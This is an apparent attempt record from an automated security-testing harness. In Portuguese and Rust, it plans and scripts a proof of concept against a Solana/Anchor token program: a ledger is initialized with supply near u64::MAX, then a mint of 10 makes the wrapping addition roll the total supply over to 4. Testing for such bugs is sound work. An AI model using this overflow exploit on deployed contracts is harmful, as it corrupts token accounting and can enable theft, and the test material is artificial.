attempts.raw:
{
  "plan": "Inicializo a conta Ledger com total_supply = u64::MAX - 5 e user_balance = 0 via a instrucao initialize (baseline legitimo). Depois chamo mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX e, com wrapping_add, faz o total_supply dar a volta para 4. O efeito medido e que o total_supply resultante e menor que o valor inicial (4 < u64::MAX - 5), demonstrando o wrap-around em vez de falha.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX - 5),
    &[
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let (system_program_id, system_program_account) = system_program_account();

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    (system_program_id, system_program_account),
];

let baseline = env.baseline("initialize ledger with near-max supply", &init_ix, &init_accounts);

let ledger_after_init = after(&baseline, &ledger_key).clone();

let mint_ix = env.anchor_ix(
    "mint",
    &(10u64),
    &[
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let r = env.attack("mint with amount causing u64 wrap-around", &mint_ix, &mint_accounts);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &ledger_key).data();
    let total_supply = read_u64(data, 40);
    let user_balance = read_u64(data, 48);
    env.effect(
        "total_supply wrapped around to a small value instead of overflowing",
        total_supply == 4 && user_balance == 10,
    );
}"
}

